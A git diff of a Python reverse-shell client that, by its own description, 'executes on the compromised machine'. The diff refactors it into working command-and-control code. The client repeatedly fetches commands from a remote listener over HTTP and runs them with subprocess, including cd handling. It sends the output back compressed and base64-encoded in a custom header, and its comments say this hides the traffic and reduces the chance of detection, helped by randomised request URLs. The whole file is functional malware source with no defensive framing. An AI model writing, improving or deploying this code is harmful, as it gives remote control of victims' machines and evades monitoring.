@@ -1,11 +1,5 @@
 '''
-Executes on the compromised machine. Spawns a reverse shell and communicates with the listener over HTTP.
-
-1. Client intitiates connection with listener (by sending cwd)
-SENDING MESSAGE
-1. Client sends output to listener (http request)
-2. Listener sends input to client (http response)
-3. Cycle repeats
+Executes on the compromised machine. A reverse shell that communicates with the listener over HTTP.
 '''
 
 import requests
@@ -13,82 +7,109 @@ import base64
 import os
 import subprocess
 import zlib
-from utils import SERVER_IP, SERVER_PORT
+from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME
 
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
 REQUEST_TIMEOUT = 60
 # The URL of the listener
-SERVER_ROOT_URL = f'http://{SERVER_IP}:{SERVER_PORT}'
+LISTENER_ROOT_URL = f'http://{LISTENER_IP}:{LISTENER_PORT}'
 
 def get_random_url():
     '''
     Generate a randomised url to visit a page on the listener's webserver.
     (because it'd look suspicious if the client kept requesting the exact same page)
+
+    Return:
+        str: The random url
     '''
     # TODO: insert code here
     # For now, just return the root url.
-    return SERVER_ROOT_URL
+    return LISTENER_ROOT_URL
 
-def send_and_receive_server(message: str):
+def compress_and_encode_string(string: str):
     '''
-    Encodes message and sends as HTTP request, then returns http response.
+    Compresses the given string to reduce size of packets sent (reducing chance of detection). 
+    Then, encodes the string such that it can be stored in the HTTP header (HTTP headers don't allow some characters), and also for obfuscation purposes.
+    
+    Arguments:
+        string (str): String to be compressed and encoded
+
+    Returns:
+        str: The resultant string
     '''
-    print(str(len(message.encode('utf-8'))) + " --> " + str(len(zlib.compress(message.encode('utf-8')))))
-    # Compress text
-    compressed_bytes = zlib.compress(message.encode('utf-8'))
     # TODO: if compressed form is LARGER, send uncompressed form, and indicate so
-    # TODO: if empty string, don't compress/encode. just send empty string
-    # Encode data into Base64 (obfuscates it, and also ensures all characters are valid to put inside http header)
-    encoded_message = base64.b64encode(compressed_bytes).decode('utf-8')
 
+    # If string is empty, no need to compress/encode it.
+    if (len(string) == 0):
+        return ""
+
+    # TEMPORARY (prints size of string before and after compression)
+    print(str(len(string.encode('utf-8'))) + " --> " + str(len(zlib.compress(string.encode('utf-8')))))
+    # Compress the string
+    compressed_bytes = zlib.compress(string.encode('utf-8'))
+    # Encode the compressed data using Base64 
+    encoded_string = base64.b64encode(compressed_bytes).decode('utf-8')
+    return encoded_string
+
+def send_stego_data_to_listener(data: str):
+    '''
+    Sends the given data to the listener using header steganography in a HTTP request,
+    then waits for the listener's HTTP response and returns it.
+
+    Arguments:
+        data (str): String data to send to the listener via a HTTP request. Before sending, the string is compressed and encoded.
+    
+    Returns:
+        str: Reply string found within the listener's HTTP response.
+    '''
     # # Send the data as part of the HTTP header
     headers = {
-        'X-Stego-Data': encoded_message
+        STEGO_HEADER_NAME: compress_and_encode_string(data)
     }
     url = get_random_url()
     response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
+    # for now, listener reply is simply stored in the response text
+    # TODO: store it via image steganoraphy
     return response.text
 
-def process_input(input: str):
+def execute_command_line_input(input: str):
     '''
-    Processes commandline input, returns output.
+    Executes the given input as command-line input on the system, returns output.
+    This is used for the reverse shell.
+
+    Arguments:
+        input (str): Command-line input to be executed on the system (e.g. 'ls -la')
+
+    Returns:
+        str: The command-line output from executing the input
     '''
     # TODO: change this copied logic
     split_input = input.split()
-    if input.lower() == "exit":
-        # if the command is exit, just break out of the loop
-        # TODO
-        return
-    # IS THIS NEEDED? 'cd' might be a terminal built-in...
-    # if split_input[0].lower() == "cd":
-    #     # cd command, change directory
-    #     try:
-    #         os.chdir(' '.join(split_input[1:]))
-    #     except FileNotFoundError as e:
-    #         # if there is an error, set as the output
-    #         output = str(e)
-    #     else:
-    #         # if operation is successful, empty message
-    #         output = ""
+    if split_input[0].lower() == "cd":
+        # Need to handle 'cd' manually, cannot use `subprocess` library
+        try:
+            # Change directory
+            os.chdir(' '.join(split_input[1:]))
+            output = os.getcwd()
+        except FileNotFoundError as e:
+            output = str(e)
     else:
-        # execute the command and retrieve the results
+        # Execute the command and retrieve the output (might be an error message if command couldn't execute)
         output = subprocess.getoutput(input)
-        # result = subprocess.run(input, shell=True, text=True, capture_output=True)
-        # # Check if input successfully ran as a command..
-        # if result.returncode == 0:
-        #     output = result.stdout
-        # else:
-        #     output = result.stderr
-    # get the current working directory as output
-    output = f"{output}"
     return output
 
 def main():
-    output = os.getcwd()
+    # First message to listener sends current working directory.
+    command_line_output = os.getcwd()
     while (True):
-        input = send_and_receive_server(output)
-        output = process_input(input)
+        '''
+        1. Client sends command-line output to listener (http request)
+        2. Listener sends command-line input to client (http response)
+        3. repeat
+        '''
+        command_line_input = send_stego_data_to_listener(command_line_output)
+        command_line_output = execute_command_line_input(command_line_input)
 
 if __name__ == '__main__':
     main()
